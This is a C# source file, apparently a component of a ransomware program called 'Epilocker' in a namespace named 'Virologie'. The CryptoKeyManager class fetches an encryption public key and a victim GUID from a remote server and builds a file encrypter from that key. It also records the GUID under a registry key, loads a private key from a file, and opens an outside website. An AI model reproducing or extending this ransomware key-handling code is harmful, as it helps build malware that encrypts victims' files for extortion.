using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Net;
using System.Xml.Serialization;
using System.IO;
using Microsoft.Win32;

namespace Virologie
{
    internal class CryptoKeyManager
    {
        public static Guid guid;

        public static FileEncrypter CreateFromServer(string address)
        {
            XmlSerializer x = new XmlSerializer(typeof (PublicKeyCryptoResponse));
            var request = WebRequest.Create(address);
            WebResponse response = request.GetResponse();

            PublicKeyCryptoResponse pkres = (PublicKeyCryptoResponse) x.Deserialize(stream: response.GetResponseStream());

            guid = pkres.guid;
            FileEncrypter ret = new FileEncrypter();
            ret.ImportKey(pkres.public_key);
            return ret;
        }

        private const string userRoot = "HKEY_CURRENT_USER";
        private const string subkey = "Software\\Epilocker";

        public static void SaveGUID()
        {
            const string keyName = userRoot + "\\" + subkey;

            Registry.SetValue(keyName, "GUID", guid);
        }

        public static bool GetGUID()
        {
            const string keyName = userRoot + "\\" + subkey;

            string value = (string) Registry.GetValue(keyName, "GUID", null);
            if (value == null)
                return false;
            guid = new Guid(value);
            return true;
        }

        public static void CleanGuid()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(subkey, true);
            if (key != null)
            {
                key.DeleteValue("GUID");
            }
        }

        public static FileEncrypter CreateFromFile(string name)
        {
            StreamReader sr = new StreamReader(new FileStream(name, FileMode.Open));
            string private_key = sr.ReadToEnd();
            sr.Close();
            FileEncrypter ret = new FileEncrypter();
            ret.ImportKey(private_key);
            return ret;
        }

        public static void OpenWebsite()
        {
            Process.Start("http://jupotter.eu");
        }
    }
}